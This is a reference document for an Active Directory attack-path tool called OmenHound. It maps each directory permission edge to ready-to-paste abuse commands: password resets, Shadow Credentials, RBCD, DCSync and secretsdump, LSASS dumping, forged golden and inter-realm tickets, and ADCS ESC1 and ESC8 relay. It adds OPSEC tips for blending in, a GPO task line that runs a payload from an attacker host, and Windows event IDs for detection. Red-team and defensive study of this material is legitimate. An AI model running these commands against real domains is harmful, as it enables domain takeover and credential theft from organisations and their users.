# OmenHound Attack-Path Reference

Practical, copy‑pasteable reference for the Active Directory relationships OmenHound
collects into Neo4j: what each edge means, how it is abused, and the OPSEC footprint it
leaves. Templates are **exploit hints, not auto‑executed** — always re‑confirm the edge
before acting.

> **AUTHORIZATION REQUIRED — READ FIRST.** Everything here changes directory state,
> steals credentials, or executes code. Use it only for **explicitly authorized**
> red‑team engagements, penetration tests, and isolated labs. Running it without written
> authorization from the system owner is illegal (CFAA, UK Computer Misuse Act, and
> equivalents). This is a reference for the OmenHound abuse‑command renderer, not a
> to‑do list.

---

## Placeholder legend

| Placeholder      | OmenHound source                | Typical value                            |
|------------------|---------------------------------|------------------------------------------|
| `{DOMAIN}`       | `Node.domain` (DNS form)        | `contoso.local`                          |
| `{SOURCE_SAM}`   | source `Node.samAccountName`    | `alice`, `svc_sql`, `WS01$`              |
| `{TARGET_SAM}`   | target `Node.samAccountName`    | `Domain Admins`, `svc_backup`, `DC01$`   |
| `{TARGET_DN}`    | target `Node.distinguishedName` | `CN=svc_backup,OU=Service,DC=contoso,…`  |
| `{TARGET_SID}`   | target `Node.id` (SID)          | `S-1-5-21-1004336348-…-1105`             |

OmenHound fills these five automatically. **Everything else in braces is
operator‑supplied** and must be replaced by you: `{DC}`, `{TARGET_FQDN}`, `{PASSWORD}`,
`{NTLM_HASH}`, `{NEW_PASSWORD}`, `{SPN}`, `{GROUP}`, `{ATTACKER_SAM}`, `{ATTACKER_PASS}`,
`{CA}`, `{TEMPLATE}`. Linux examples use the Impacket console‑script prefixes; on Windows
use the native binary (`Rubeus.exe`, `Certipy.exe`, …). `{DC}` is any DC IP/hostname.

The renderer keys templates off `model.EdgeKind` (mirrors BloodHound CE edge names),
resolves source/target nodes, and substitutes the five placeholders above plus the
per‑technique OPSEC note.

---

## Edge reference

### GenericAll

- **Meaning:** Full control of the target object (read/write every attribute, edit the
  DACL/owner, delete).
- **Abuse:** User → reset password, targeted kerberoast, or Shadow Credentials.
  Computer → RBCD. Group → add member. OU/Domain → link GPO or grant DCSync.
- ```bash
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} set password {TARGET_SAM} '{NEW_PASSWORD}'
  certipy shadow auto -u {SOURCE_SAM}@{DOMAIN} -p {PASSWORD} -account {TARGET_SAM} -dc-ip {DC}
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} add rbcd '{TARGET_SAM}$' '{ATTACKER_SAM}'
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} add groupMember '{TARGET_SAM}' {SOURCE_SAM}
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} add dcsync {SOURCE_SAM}
  ```
- **OPSEC / detection:** Reset → **4724** + **4738**. Group add → **4728/4732/4756**.
  Shadow Credentials → **5136** (`msDS-KeyCredentialLink`), **4662** if DS auditing.
  RBCD write → **4742**. DCSync grant → **5136** on the domain NC. The DCSync grant is
  the loudest; a Kerberos‑read‑only abuse is the quietest.

### GenericWrite

- **Meaning:** Can modify most attributes of the target, but not the DACL/owner.
- **Abuse:** Targeted kerberoast (write a `servicePrincipalName`), Shadow Credentials,
  or RBCD on a computer (`msDS-AllowedToActOnBehalfOfOtherIdentity`).
- ```bash
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} set object {TARGET_SAM} servicePrincipalName -v 'fake/spn'
  impacket-GetUserSPNs {DOMAIN}/{SOURCE_SAM}:{PASSWORD} -dc-ip {DC} -request-user {TARGET_SAM} -outputfile {TARGET_SAM}.kerberoast
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} set object {TARGET_SAM} servicePrincipalName   # revert
  ```
- **OPSEC / detection:** SPN write → **4738**/**4742**; roast → **4769** with RC4
  (`0x17`), an anomaly on modern domains. Shadow Credentials → **5136**/**4662**; RBCD →
  **4742**. Always revert the SPN / shadow credential afterwards.

### WriteDacl

- **Meaning:** Can rewrite the target's security descriptor — a force multiplier, not an
  end in itself.
- **Abuse:** Grant yourself `GenericAll` on the target, or `DCSync` if the target is the
  domain object, then run that playbook.
- ```bash
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} add genericAll '{TARGET_DN}' {SOURCE_SAM}
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} add dcsync {SOURCE_SAM}
  # SID form of the same grant (PowerView), useful when only the SID is known:
  # Add-DomainObjectAcl -TargetIdentity {TARGET_SID} -PrincipalIdentity {SOURCE_SAM} -Rights DCSync
  ```
- **OPSEC / detection:** DACL rewrites → **5136** (`nTSecurityDescriptor`); **4662** with
  DS auditing. A non‑admin principal holding `GenericAll` is essentially never benign.
  Grant the narrowest right you need (`DCSync` over `GenericAll`) to shrink the audit
  blast radius.

### WriteOwner

- **Meaning:** Can change the target's owner. Owners implicitly hold `WRITE_DAC` +
  `READ_CONTROL`, so this is a self‑service path to full control.
- **Abuse:** Take ownership, then (as owner) rewrite the DACL to grant yourself
  `GenericAll`, then continue as GenericAll.
- ```bash
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} set owner '{TARGET_DN}' {SOURCE_SAM}
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} add genericAll '{TARGET_DN}' {SOURCE_SAM}
  ```
- **OPSEC / detection:** Ownership + DACL changes → two **5136** events. `5136` owner
  changes can slip past alerts that only watch DACL ACEs unless owner‑SID is monitored.
  Two writes are noisier than `GenericAll`; restore the original owner on cleanup.

### ForceChangePassword

- **Meaning:** Holds the extended right **User‑Force‑Change‑Password**
  (`00299570-246d-11d0-a768-00aa006e0529`) — reset the target's password without knowing
  the current one, no `GenericAll` required.
- **Abuse:** Reset to a known password, authenticate as the target, revert. Quieter than
  SPN writes but locks the real user out and is very visible to them.
- ```bash
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} set password {TARGET_SAM} '{NEW_PASSWORD}'
  impacket-smbpasswd '{DOMAIN}/{SOURCE_SAM}:{PASSWORD}@{TARGET_FQDN}' -newpass '{NEW_PASSWORD}' -newhash ''
  ```
- **OPSEC / detection:** **4724** (reset attempt, attributed to `{SOURCE_SAM}` — a
  smoking gun if the actor is not helpdesk) and **4738**. Invalidates the victim's cached
  Kerberos tickets. Revert immediately; expect the victim to notice.

### AddMember

- **Meaning:** Write‑membership right on the target group — add arbitrary principals to
  it. Privileged groups make this instant escalation.
- **Abuse:** Add a controlled principal (prefer a service or machine account over a
  human, to blend in).
- ```bash
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} add groupMember '{TARGET_SAM}' {SOURCE_SAM}
  impacket-net rpc -dc-ip {DC} '{DOMAIN}/{SOURCE_SAM}:{PASSWORD}'@{DC} --action add group '{TARGET_SAM}' {SOURCE_SAM}
  ```
- **OPSEC / detection:** **4728** (global), **4732** (local/domain‑local), **4756**
  (universal). High‑value alerts when the group has `adminCount=1`. Remove the membership
  immediately after use.

### AddSelf

- **Meaning:** Like AddMember, but the ACE lets the source add **itself** to the group.
- **Abuse:** Self‑join the target group, escalate, then leave. Local Administrators →
  AdminTo; a privileged domain group → DA path.
- ```bash
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} add groupMember '{TARGET_SAM}' {SOURCE_SAM}
  ```
- **OPSEC / detection:** Identical to AddMember (**4728/4732/4756**). Non‑admin
  write‑membership is a known escalation primitive and a common alert. Remove self the
  moment the objective is met.

### Owns

- **Meaning:** The source is the target's owner SID. Owners implicitly hold `WRITE_DAC` +
  `READ_CONTROL` → self‑service path to `WriteDacl` → `GenericAll`.
- **Abuse:** As owner, rewrite the DACL to grant yourself full control, then continue as
  GenericAll. This is the finished state of a WriteOwner chain.
- ```bash
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} add genericAll '{TARGET_DN}' {SOURCE_SAM}
  ```
- **OPSEC / detection:** The DACL rewrite → **5136**. Owner changes bypass `WRITE_DAC`
  ACE auditing on the old DACL, so monitor owner‑SID changes explicitly. `SeTakeOwnership`
  use shows as **4672**.

### AllowedToDelegate (constrained delegation)

- **Meaning:** The target appears in the source's `msDS-AllowedToDelegateTo` list — the
  source may perform Kerberos **constrained delegation** to the target's SPN and
  impersonate *any* user to it.
- **Abuse:** With the source's password/hash, use S4U2Self + S4U2Proxy to mint a ticket as
  `Administrator` for the allowed SPN. No victim interaction.
- ```bash
  impacket-getST -spn {SPN} -impersonate Administrator -dc-ip {DC} '{DOMAIN}/{SOURCE_SAM}:{PASSWORD}' -hashes :{NTLM_HASH}
  export KRB5CCNAME=Administrator@{SPN%%/*}.ccache
  impacket-psexec -k -no-pass {TARGET_FQDN}
  ```
- **OPSEC / detection:** **4769** with S4U2Self/S4U2Proxy flags and a `Transited
  Services` value that differs from the requested SPN. `msDS-AllowedToDelegateTo` writes →
  **5136**. Network detection is weak (legit Kerberos); identity alerting on the
  impersonated `Administrator` SPN is strongest.

### AllowedToAct (RBCD)

- **Meaning:** The source can write the target computer's
  `msDS-AllowedToActOnBehalfOfOtherIdentity` — configure **Resource‑Based Constrained
  Delegation**. The attacker‑friendly delegation primitive.
- **Abuse:** Create/take an account you control (often a machine account), point the
  target's RBCD at it, then S4U‑impersonate `Administrator` for a service on the target.
- ```bash
  impacket-addcomputer -dc-ip {DC} '{DOMAIN}/{SOURCE_SAM}:{PASSWORD}' -computer-name 'EVIL$' -computer-pass '{ATTACKER_PASS}' -method SAMR
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} add rbcd '{TARGET_SAM}$' 'EVIL$'
  impacket-getST -impersonate Administrator -spn 'cifs/{TARGET_FQDN}' -dc-ip {DC} '{DOMAIN}/EVIL$:{ATTACKER_PASS}'
  export KRB5CCNAME=Administrator@cifs_{TARGET_FQDN}.ccache && impacket-psexec -k -no-pass {TARGET_FQDN}
  ```
- **OPSEC / detection:** Machine‑account creation → **4741**; RBCD attribute write →
  **4742**; S4U → **4769** with delegation flags. The discrete 4742 is often the easiest
  detection. `ms-DS-MachineAccountQuota` limits account creation and is commonly alerted.

### AdminTo

- **Meaning:** The source is a **local administrator** on the target computer (`$`
  account) — direct remote code execution.
- **Abuse:** Dump local secrets (SAM/LSA) or run commands; steal sessions on the host
  (**HasSession**) if privileged users are logged in.
- ```bash
  impacket-secretsdump '{DOMAIN}/{SOURCE_SAM}:{PASSWORD}@{TARGET_FQDN}'
  nxc smb {TARGET_FQDN} -u {SOURCE_SAM} -p {PASSWORD} --sam --lsa
  nxc smb {TARGET_FQDN} -u {SOURCE_SAM} -p {PASSWORD} -x 'whoami /all'
  ```
- **OPSEC / detection:** Service creation → **4697** + **7045**; spawned process →
  **4688**; network logon → **4624** type 3; privileges → **4672**. LSASS access for a
  dump → Sysmon **10** / **4656**; remote registry SAM reads → **4657**.

### CanPSRemote

- **Meaning:** May log on over **WinRM / PowerShell Remoting** (e.g. `Remote Management
  Users`), giving interactive PowerShell in the source's context.
- **Abuse:** Open a WinRM session for command execution, token discovery, or a stable C2
  channel that blends with admin traffic.
- ```bash
  nxc winrm {TARGET_FQDN} -u {SOURCE_SAM} -p {PASSWORD} -x 'whoami /groups'
  evil-winrm -i {TARGET_FQDN} -u {SOURCE_SAM} -p '{PASSWORD}'
  ```
- **OPSEC / detection:** WinRM/Operational **91** (session created), **142** (closed),
  **6** (auth); Security **4624** type 3; `wsmprovhost.exe` hosting child commands →
  **4688**. Prefer remoting over PSExec where throughput matters and service creation is
  monitored.

### ExecuteDCOM

- **Meaning:** Remote DCOM execution rights on the target (local admin or DCOM launch
  ACL). Executes code **without creating a service**.
- **Abuse:** Use `MMC20.Application` / `ShellWindows` / `ShellBrowserWindow` to spawn a
  process; `wmiexec` is the fallback.
- ```bash
  impacket-dcomexec -object MMC20 '{DOMAIN}/{SOURCE_SAM}:{PASSWORD}@{TARGET_FQDN}' 'cmd /c whoami'
  impacket-wmiexec '{DOMAIN}/{SOURCE_SAM}:{PASSWORD}@{TARGET_FQDN}' 'whoami'
  ```
- **OPSEC / detection:** `mmc.exe`/`wmiprvse.exe` with a child process → **4688** /
  Sysmon **1**; DCOM/Operational **10001**/**10028**; **4624** type 3 + **4672**. No
  service‑creation event — the reason DCOM is preferred when services are monitored.

### HasSession

- **Meaning:** The source user has an active logon session on the target computer. Not an
  escalation edge — it is *how you find credentials to steal*.
- **Abuse:** If you are admin on the host, dump LSASS (cleartext/hash) or steal the
  user's Kerberos tickets. If not, treat it as a path: become admin (**AdminTo**), then
  dump. Enumerate sessions to find where privileged users live.
- ```bash
  nxc smb {TARGET_FQDN} -u {SOURCE_SAM} -p {PASSWORD} --sessions
  nxc smb {TARGET_FQDN} -u {SOURCE_SAM} -p {PASSWORD} -M lsassy
  ```
- **OPSEC / detection:** Network logons → **4624** type 3 (interactive/RDP → type 2/10).
  Enumeration is low‑noise LDAP/SMB; the LSASS dump is the loud part → Sysmon **10**,
  **4656**, or EDR process‑access alerts.

### MemberOf

- **Meaning:** The source is a member of the target group. Structural — defines effective
  privilege; nesting can hide a DA path behind an innocuous group.
- **Abuse:** No exploit. Identify direct DA/EA membership, follow nesting chains, and
  combine with `AddMember`/`AddSelf` (a group that can add to another group is a chain).
- ```bash
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} get group '{TARGET_SAM}' --members
  ```
- **OPSEC / detection:** Read‑only (LDAP bind + search) — near‑zero footprint. The *act*
  of joining is what matters (**4728/4732/4756**). Audit nesting regularly.

### DCSync

- **Meaning:** Holds **both** replication rights on the domain —
  `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` — and can replicate
  password hashes (incl. `krbtgt`). Direct DA / Golden Ticket path.
- **Abuse:** Trigger a replication request and dump all secrets, or one high‑value
  account (`krbtgt`, `Administrator`).
- ```bash
  impacket-secretsdump '{DOMAIN}/{SOURCE_SAM}:{PASSWORD}@{DC}' -just-dc
  impacket-secretsdump '{DOMAIN}/{SOURCE_SAM}' -hashes :{NTLM_HASH}@{DC} -just-dc-user krbtgt
  nxc smb {DC} -u {SOURCE_SAM} -p {PASSWORD} --ntds
  ```
- **OPSEC / detection:** **4662** on the domain NC with replication GUIDs
  `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (Get-Changes) and
  `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (Get-Changes-All) — **only if "Directory Service
  Access" auditing is enabled with a SACL**. A non‑DC issuing `DrsGetNCChanges` is loud
  and unmistakable. Rotate `krbtgt` if it was ever pulled.

### GetChanges

- **Meaning:** Holds `DS-Replication-Get-Changes`
  (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) without `-All` — sees change metadata, cannot
  read secret attributes. Half of a DCSync.
- **Abuse:** Not credential theft alone; pair with `GetChangesAll` on the same principal
  to reach DCSync.
- ```bash
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} get object '{TARGET_DN}' --attr nTSecurityDescriptor
  impacket-secretsdump '{DOMAIN}/{SOURCE_SAM}:{PASSWORD}@{DC}' -just-dc   # once both rights present
  ```
- **OPSEC / detection:** A request with only Get‑Changes still touches **4662** with GUID
  `1131f6aa…` and fails the secret read — quieter than full DCSync but anomalous from a
  non‑DC principal. Any non‑DC `DrsGetNCChanges` is suspicious.

### GetChangesAll

- **Meaning:** Holds `DS-Replication-Get-Changes-All`
  (`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`) — the right that permits reading **replicated
  secrets**. Needs the companion `GetChanges` to complete a DCSync.
- **Abuse:** With both rights, full DCSync. If the graph shows both edges from the same
  principal to the domain, plan it as `DCSync`.
- ```bash
  impacket-secretsdump '{DOMAIN}/{SOURCE_SAM}:{PASSWORD}@{DC}' -just-dc
  ```
- **OPSEC / detection:** Same **4662** GUID `1131f6ad…`. A non‑DC holding both rights is
  a critical misconfiguration — rotate `krbtgt` if it was abused, since a pulled `krbtgt`
  hash invalidates password resets.

### ReadLAPSPassword

- **Meaning:** Can read the target computer's LAPS password (`ms-Mcs-AdmPwd` legacy, or
  `msLAPS-Password` / `msLAPS-EncryptedPassword` on Windows LAPS) → the host's **local
  administrator** password.
- **Abuse:** Read it, authenticate as local admin, hunt sessions (**HasSession**) or move
  laterally. LAPS rotates on a timer, so act quickly.
- ```bash
  nxc ldap {DC} -u {SOURCE_SAM} -p {PASSWORD} -M laps
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} get object '{TARGET_DN}' --attr ms-Mcs-AdmPwd
  ```
- **OPSEC / detection:** Attribute reads → **4662** when DS auditing covers the attribute
  or computer object; **5136** on Windows LAPS rotation. LDAP otherwise low‑noise. Alert
  on any principal other than the designated LAPS readers accessing these attributes.

### ReadGMSAPassword

- **Meaning:** Can read a **group Managed Service Account**'s blob
  (`msDS-ManagedPassword`) → the gMSA's NTLM hash/password, usually a privileged service
  account.
- **Abuse:** Extract the password and authenticate as the gMSA for silver‑ticket / lateral
  movement; gMSAs are often over‑privileged and close to DA.
- ```bash
  nxc ldap {DC} -u {SOURCE_SAM} -p {PASSWORD} --gmsa
  gMSADumper.py -u {SOURCE_SAM} -p '{PASSWORD}' -d {DOMAIN} -l {DC}
  ```
- **OPSEC / detection:** Read of `msDS-ManagedPassword` → **4662** if audited; should be
  restricted to `PrincipalsAllowedToRetrieveManagedPassword`. Any other reader is an
  indicator. Follow‑on service logons → **4624** type 3 / **4648**.

### Contains

- **Meaning:** Structural containment (OU/domain contains a user, group, computer, or
  child OU). Not an exploit — it drives **ACL and GPO inheritance**.
- **Abuse:** No direct command. Use it to reason about `GPLink` scope (a GPO applies to
  everything the OU contains) and inherited ACEs (`GenericAll`/`WriteDacl` on an OU can be
  re‑aimed at a child object).
- ```bash
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} get children '{TARGET_DN}'
  ```
- **OPSEC / detection:** Read‑only LDAP search — effectively no footprint. The actual
  abuse lands on the inherited ACEs (see **GenericAll** / **WriteDacl**) and their
  **5136** events.

### GPLink

- **Meaning:** A GPO is **linked** to the target OU/domain/site. With write access to the
  GPO object (or the link), you can push configuration — including an immediate scheduled
  task — to every machine in scope.
- **Abuse:** Confirm write access to the GPO, add an Immediate Task running as `SYSTEM`,
  then wait for (or trigger) policy refresh.
- ```bash
  nxc ldap {DC} -u {SOURCE_SAM} -p {PASSWORD} -M gpp_password
  bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} get object '{TARGET_DN}' --attr gPLink
  # SharpGPOAbuse.exe --AddComputerTask --TaskName Upd --Author {DOMAIN}\Administrator \
  #   --Command cmd.exe --Arguments "/c \\{ATTACKER_FQDN}\share\payload.bat" --GPOName "{GPO_NAME}"
  ```
- **OPSEC / detection:** GPO object edits → **5136** (create/delete → **5137**/**5141**);
  client task creation → **4698**, update → **4702**, spawned process → **4688**. SYSVOL
  changes may hit FIM. Powerful but well‑monitored in mature environments.

### TrustedBy

- **Meaning:** The target domain is trusted by the source domain — an inter‑realm
  relationship. Trust keys and SID filtering govern what can be forged across it.
- **Abuse:** SID‑history injection / inter‑realm Golden Ticket (true when
  `SIDFilteringForestAware` is off) using a `krbtgt` or trust key; or extract the trust key
  (`lsadump::trust`) / DCSync the trusted domain's `krbtgt`, then `raiseChild`.
- ```bash
  impacket-ticketer -nthash {TRUST_KRBTGT_HASH} -domain {DOMAIN} -domain-sid {DOMAIN_SID} -extra-sid {ENTERPRISE_SID}-519 -spn krbtgt/{TRUSTED_DOMAIN} Administrator
  export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass {TRUSTED_DC_FQDN}
  ```
- **OPSEC / detection:** Forged cross‑realm TGTs → **4624** type 3 + **4769** with an
  unexpected SID history / encryption downgrade; SID‑history injection → **4765** /
  **4766**. `kerberos::golden` leaves nothing on the DC until the ticket is used — lean on
  SID‑filtering enforcement plus **4624/4769** correlation.

---

## Full attack-path examples

**1. Kerberoastable → GenericAll → DA.** `impacket-GetUserSPNs
{DOMAIN}/{USER}:{PASSWORD} -dc-ip {DC} -request` → crack `svc_sql` offline (hashcat
`-m 13100`) → authenticate → enumerate ACLs → `bloodyAD … add groupMember 'Helpdesk
Admins' svc_sql` (**4728**) → repeat for `Domain Admins` → verify with `whoami /groups`.

**2. RBCD chain.** `impacket-addcomputer` (or take an existing machine account) →
`bloodyAD … add rbcd '{TARGET_SAM}$' 'EVIL$'` (**4742**) → `impacket-getST -impersonate
Administrator -spn cifs/{TARGET_FQDN} '{DOMAIN}/EVIL$:{ATTACKER_PASS}'` →
`KRB5CCNAME=…ccache impacket-psexec -k -no-pass {TARGET_FQDN}`.

**3. DCSync path.** `bloodyAD … add dcsync {SOURCE_SAM}` (or `Add-DomainObjectAcl -Rights
DCSync`) → `impacket-secretsdump '{DOMAIN}/{SOURCE_SAM}:{PASSWORD}@{DC}' -just-dc` → forge
a Golden Ticket from `krbtgt`, or use the harvested DA hash directly.

**4. ADCS ESC1 / ESC8.** OmenHound records the ACL/relay edges feeding ADCS abuse; the
template misconfiguration comes from `certipy find`.

- **ESC1** (enrollee supplies a SAN, low‑priv principal may enroll):
  ```bash
  certipy find -u {SOURCE_SAM}@{DOMAIN} -p {PASSWORD} -dc-ip {DC} -vulnerable -stdout
  certipy req -u {SOURCE_SAM}@{DOMAIN} -p {PASSWORD} -dc-ip {DC} -ca '{CA}' -template '{TEMPLATE}' -upn administrator@{DOMAIN}
  certipy auth -pfx administrator.pfx -dc-ip {DC}     # yields Administrator NT hash
  ```
- **ESC8** (CA HTTP enrollment accepts NTLM without EPA; relay a coerced machine auth):
  ```bash
  certipy relay -target 'http://{CA}/certsrv/certfnsh.asp' -template '{TEMPLATE}'
  # pair with PetitPotam / DFSCoerce / PrinterBug, then:
  certipy auth -pfx dc01.pfx -dc-ip {DC}              # DC machine hash → DCSync
  ```
  Detection: CA **4886**/**4887** plus `certsrv` enrollment traffic; unusual SANs /
  `Administrator` UPNs are the tell.

---

## Tool invocation reference

| Tool          | Purpose                      | Invocation shape |
|---------------|------------------------------|------------------|
| **BloodyAD**  | ACL / password / group ops   | `bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p {PASSWORD} <action> <target> <value>` — `<action>` ∈ `set password`, `add groupMember`, `add dcsync`, `add genericAll`, `add rbcd`, `set owner`, `get object --attr …`, `get children` |
| **Impacket**  | Kerberos, SMB, secrets, exec | `impacket-secretsdump '{DOMAIN}/{USER}:{PASS}@{HOST}' -just-dc`; `impacket-getST -spn {SPN} -impersonate Administrator '{DOMAIN}/{USER}:{PASS}'`; `impacket-getTGT '{DOMAIN}/{USER}:{PASS}'`; `impacket-dcomexec -object MMC20 '{DOMAIN}/{USER}:{PASS}@{HOST}' 'cmd /c whoami'`; `impacket-addcomputer -computer-name 'EVIL$' -computer-pass '{PASS}' '{DOMAIN}/{USER}:{PASS}'` |
| **Rubeus**    | Kerberos (Windows)           | `Rubeus.exe kerberoast /outfile:hashes.txt`; `Rubeus.exe asreproast /format:hashcat`; `Rubeus.exe s4u /user:{SOURCE_SAM} /rc4:{HASH} /impersonateuser:Administrator /msdsspn:cifs/{TARGET_FQDN} /altservice:cifs,host /ptt`; `Rubeus.exe golden /sid:{DOMAIN_SID} /krbtgt:{HASH}` |
| **Certipy**   | ADCS enumeration & abuse     | `certipy find -u {SOURCE_SAM}@{DOMAIN} -p {PASSWORD} -dc-ip {DC} -vulnerable -stdout`; `certipy req … -ca {CA} -template {TEMPLATE} -upn administrator@{DOMAIN}`; `certipy auth -pfx administrator.pfx -dc-ip {DC}`; `certipy relay -target 'http://{CA}/certsrv/certfnsh.asp' -template {TEMPLATE}` |
| **PowerView** | AD enumeration (Windows)     | `Get-DomainUser -SPN`; `Get-DomainObjectAcl -ResolveGUIDs`; `Add-DomainObjectAcl -TargetIdentity '{TARGET_DN}' -PrincipalIdentity {SOURCE_SAM} -Rights DCSync`; `Add-DomainGroupMember -Identity '{TARGET_SAM}' -Members {SOURCE_SAM}`; `Set-DomainObjectOwner -Identity '{TARGET_DN}' -OwnerIdentity {SOURCE_SAM}`; `Find-LocalAdminAccess` |
| **netexec**   | Sweep / spray / lateral      | `nxc smb {TARGET_FQDN} -u {SOURCE_SAM} -p {PASSWORD} --sam --lsa`; `nxc winrm {TARGET_FQDN} -u {SOURCE_SAM} -p {PASSWORD} -x whoami`; `nxc ldap {DC} -u {SOURCE_SAM} -p {PASSWORD} -M laps`; `nxc smb {DC} -u {SOURCE_SAM} -p {PASSWORD} --ntds` |

Prefer `-hashes :{NTLM_HASH}` or `-k -no-pass` with a `.ccache` over plaintext passwords —
fewer credential artifacts on disk and in shell history.

---

## Windows event ID quick reference

| Action (edge) | Event IDs | Notes |
|---|---|---|
| Password reset (`ForceChangePassword`, `GenericAll` user) | **4724**, **4738** | 4724 attributes the actor |
| Self password change | **4723** | |
| Group membership add (`AddMember`, `AddSelf`) | **4728/4732/4756** | `adminCount=1` groups are the alert |
| Kerberoast TGS request | **4769** | RC4 `0x17` = downgrade signal |
| AS‑REP roast | **4768** | pre‑auth not required |
| SPN / attribute write (`GenericWrite`) | **4738** (user), **4742** (computer) | |
| DACL / owner / attribute change (`GenericAll`, `WriteDacl`, `WriteOwner`, `Owns`) | **5136** (+ **5137**/**5141**) | `nTSecurityDescriptor`; needs DS auditing |
| Object access (`GetChanges`, `GetChangesAll`, `ReadLAPS/GMSAPassword`) | **4662** | needs DS‑access SACL |
| DCSync replication | **4662** with `1131f6aa-…` / `1131f6ad-…` | `krbtgt` read = critical |
| RBCD setup | **4741**, **4742**, **4769** (S4U) | machine‑account quota relevant |
| Constrained delegation use | **4769** with S4U2Self/S4U2Proxy | `Transited Services` anomaly |
| SID‑history injection (`TrustedBy`) | **4765** / **4766** | forest escalation |
| Golden / inter‑realm ticket use | **4769**, **4624** type 3 | anomalous lifetime / encryption |
| Remote service exec (`AdminTo`, PSExec) | **4697**, **7045**, **4688**, **4624** type 3, **4672** | service creation is the tell |
| WinRM (`CanPSRemote`) | **91**, **142**, **6** (WinRM/Operational), **4624** type 3, **4688** | `wsmprovhost.exe` parent |
| DCOM (`ExecuteDCOM`) | **10001**/**10028**, **4688**, **4624** type 3 | no service‑creation event |
| LSASS access | Sysmon **10**, **4656**, **4688** | EDR‑dependent |
| GPO modification (`GPLink`) | **5136/5137/5141**, **4698**, **4702**, **4688** | SYSVOL + host task |
| ADCS enrollment (`ESC1`/`ESC8`) | CA **4886**, **4887** | unusual SAN / `Administrator` UPN |

> **Auditing prerequisites.** `4662`, `5136`, and many object‑access events only appear
> when "Audit Directory Service Access" (and, for some attributes, an explicit SACL) is
> enabled. If a detection is missing, verify auditing before assuming the action did not
> happen.

---

## Canned analytics queries

`omenhound serve` exposes the same questions BloodHound CE's Attack Paths asks, as
canned queries over the current graph. `GET /api/v1/analytics` lists them;
`GET /api/v1/analytics/{id}` runs one, and the UI shows them under **Attack Paths**.

| Query id | Needs | Answers |
|---|---|---|
| `kerberoastable` | `hasspn` / `serviceprincipalname` | Users with an SPN (TGS ready to crack offline) |
| `asreproastable` | `dontreqpreauth` | Users without Kerberos pre-authentication |
| `dcsync` | `GetChanges`/`GetChangesAll`/`GetChangesInFilteredSet`/`DCSync` → `Domain` | Principals that can replicate credential hashes |
| `laps-readable` | `ReadLAPSPassword` → `Computer` | Principals that can read a host's LAPS password |
| `password-never-expires` | `pwdneverexpires` | Users whose password never expires |
| `unconstrained-delegation` | `unconstraineddelegation` | Hosts/accounts that cache presented TGTs |
| `constrained-delegation` | `AllowedToDelegate` | Principals delegated to specific services |
| `rbcd` | `AllowedToAct` | Principals that can configure RBCD |
| `adminto` | `AdminTo` → `Computer` | Local administrators of a host |
| `has-session` | `HasSession` → `Computer` | Observed logon sessions |
| `high-value-targets` | `highvalue` | The usual goals of an attack path |
| `admincount` | `admincount` | AdminSDHolder-protected users/groups |
| `sensitive-users` | `sensitive` | Accounts that cannot be delegated |
| `owned` | `owned` | Sources already marked compromised |

Each result carries the **evidence** that matched (`evidence`) and, for
relationship-backed queries, the **`related`** target ids. When the attribute or
relationship a query needs is absent from the whole graph, the result includes a
`notes` entry saying so — an empty answer is only evidence of absence when the data
was actually collected.

---

## Final word on authorization

All techniques and commands here are for **authorized red‑team engagements, penetration
tests, and isolated lab ranges only**. Before running anything: (1) confirm **explicit
written authorization** naming the target domains/systems and time window; (2) confirm
the rules of engagement (allowed/prohibited actions — e.g. no `krbtgt` rotation, no
destructive changes — and the outage contact); (3) prefer **reversible, minimal‑footprint**
actions and log/revert every change (group membership, ACLs, SPNs, RBCD attributes,
ownership); (4) never run DCSync, `secretsdump -just-dc`, or trust‑key extraction outside
scope — they exfiltrate the keys to the entire directory. Misuse is illegal; you are
responsible for staying inside your authorization.
